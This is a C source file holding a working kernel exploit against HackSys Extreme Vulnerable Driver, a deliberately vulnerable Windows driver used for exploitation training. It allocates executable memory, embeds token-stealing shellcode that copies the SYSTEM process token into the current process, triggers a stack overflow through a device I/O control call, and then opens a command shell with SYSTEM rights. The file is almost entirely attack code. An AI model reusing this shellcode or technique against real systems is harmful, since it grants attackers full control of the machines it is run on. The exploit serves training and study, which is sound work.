#include<stdio.h>
#include<Windows.h>

int main()
{
	HANDLE hevd = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);

	if (hevd == INVALID_HANDLE_VALUE) {
		wprintf(L"[-] Failed to open hevd\n");
		exit(-1);
	}
	else {
		wprintf(L"[+] Success to open hevd\n");
	}

	LPVOID Buffer = VirtualAlloc(NULL,
		4096,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	char shellcode[] =
		"\x60"                            // pushad
		"\x31\xc0"                        // xor eax, eax
		"\x64\x8b\x80\x24\x01\x00\x00"    // mov eax, [fs:eax + 0x124]
		"\x8b\x40\x50"                    // mov eax, [eax + 0x50]
		"\x89\xc1"                        // mov ecx, eax
		"\xba\x04\x00\x00\x00"            // mov edx, 0x4
		"\x8b\x80\xb8\x00\x00\x00"        // mov eax, [eax + 0xb8]
		"\x2d\xb8\x00\x00\x00"            // sub eax, 0xb8
		"\x39\x90\xb4\x00\x00\x00"        // cmp[eax + 0xb4], edx
		"\x75\xed"                        // jnz 0x1a
		"\x8b\x90\xf8\x00\x00\x00"        // mov edx, [eax + 0xf8]
		"\x89\x91\xf8\x00\x00\x00"        // mov[ecx + 0xf8], edx
		"\x61"                            // popad
		"\x5d"
		"\xc2\x08\x00";

	RtlCopyMemory(Buffer, shellcode, 61);
	DWORD *ret = (DWORD*)((int)Buffer + 2080);
	*ret = (DWORD)Buffer;
	DWORD byteret;

	bool result = DeviceIoControl(hevd,
		0x222003,
		Buffer,
		2080 + 4,
		NULL,
		0,
		&byteret,
		NULL);

	if (result == 0) {
		wprintf(L"[-] Failed send payload\n");
		exit(-1);
	}
	else {
		wprintf(L"[+] Success send payload\n");
	}

	system("cmd.exe");
	return 0;
}
